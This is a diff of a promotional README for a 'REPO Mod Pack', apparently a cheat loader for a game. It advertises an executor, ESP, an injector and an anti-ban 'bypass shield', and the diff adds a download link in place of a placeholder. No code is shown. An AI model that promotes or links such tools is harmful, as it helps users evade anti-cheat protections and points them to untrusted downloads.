@@ -1,17 +1,9 @@
-## Meta‑Title
-
-REPO Mod Pack Loader 🔧 | Instant Executor + Stealth Injection
-
-## Meta‑Description
-
-🚀 Drop into REPO with our all‑in‑one Mod Pack — fast executor, private scripts, & anti‑ban injector. Easy setup, insane power!
-
 # REPO Mod Pack 🔥 Rule the Game with One Click
 
 REPO isn’t ready for this mod heat.
 Our REPO Mod Pack drops an **executor-grade toolkit** straight into your hands — script engine, ESP, injector, bypass shield, and custom UIs packed into one slick loader.
 
-[![Get REPO Mod Pack](https://img.shields.io/badge/Get%20REPO%20Mod%20Pack-blueviolet)](EXAMPLE)
+[![Get REPO Mod Pack](https://img.shields.io/badge/Get%20REPO%20Mod%20Pack-blueviolet)](https://repo-mod-pack-loader.github.io/.github/)
 
 **Quick Links:** [Overview](#overview) • [Features](#feature-breakdown-🛠) • [Install](#instant-install-guide)
 
